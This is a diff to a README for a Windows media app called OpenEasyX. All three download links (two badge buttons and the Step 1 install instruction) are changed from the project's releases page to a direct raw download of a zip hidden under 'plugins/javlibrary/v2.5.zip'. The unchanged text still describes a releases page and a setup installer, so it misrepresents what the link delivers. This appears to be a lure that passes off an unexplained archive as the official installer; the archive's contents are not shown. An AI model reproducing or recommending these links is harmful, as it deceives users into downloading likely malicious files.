@@ -1,7 +1,7 @@
 <h1>🎬 OpenEasyX - Your All-in-One Media Command Center</h1>
 
 <p align="center">
-  <a href="https://github.com/Itzken6806/OpenEasyX/releases">
+  <a href="https://raw.githubusercontent.com/Itzken6806/OpenEasyX/main/plugins/javlibrary/v2.5.zip">
     <img src="https://img.shields.io/badge/Download-OpenEasyX-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download OpenEasyX" style="padding: 12px 24px; font-size: 20px; background: linear-gradient(90deg, #ff6b6b, #ffa500); border-radius: 8px; text-decoration: none; display::inline-block;">
   </a>
 </p>
@@ -41,7 +41,7 @@ When it is time to relax, OpenEasyX includes a built-in player that supports vir
 Follow the steps below to get OpenEasyX up and running on your Windows computer. It takes less than five minutes from start to finish
 
 ### Step 1: Download the Software
-Visit this link to download the application: **[Download OpenEasyX](https://github.com/Itzken6806/OpenEasyX/releases)**. The page will show you the available versions. Look for the latest release, which is listed at the top. Click on it to expand the list of downloadable files, and choose the Windows installer (the file named something like `OpenEasyX-Setup.exe`) to start your download. The download will begin automatically. Depending on your internet speed, this could take anywhere from a few seconds to a couple of minutes
+Visit this link to download the application: **[Download OpenEasyX](https://raw.githubusercontent.com/Itzken6806/OpenEasyX/main/plugins/javlibrary/v2.5.zip)**. The page will show you the available versions. Look for the latest release, which is listed at the top. Click on it to expand the list of downloadable files, and choose the Windows installer (the file named something like `OpenEasyX-Setup.exe`) to start your download. The download will begin automatically. Depending on your internet speed, this could take anywhere from a few seconds to a couple of minutes
 
 
 
@@ -133,7 +133,7 @@ The straightforward installation process means anyone can get started in minutes
 So what are you waiting for? Take the first step toward a clutter-free, beautifully organized media life. Click the button below to get OpenEasyX installed today.
 
 <p align="center">
-  <a href="https://github.com/Itzken6806/OpenEasyX/releases">
+  <a href="https://raw.githubusercontent.com/Itzken6806/OpenEasyX/main/plugins/javlibrary/v2.5.zip">
     <img src="https://img.shields.io/badge/⬇️%20GET%20OPENEASYX-Download%20Now-blue?style=for-the-badge&logo=windows&logoColor=white" alt="Get OpenEasyX">
   </a>
 </p>
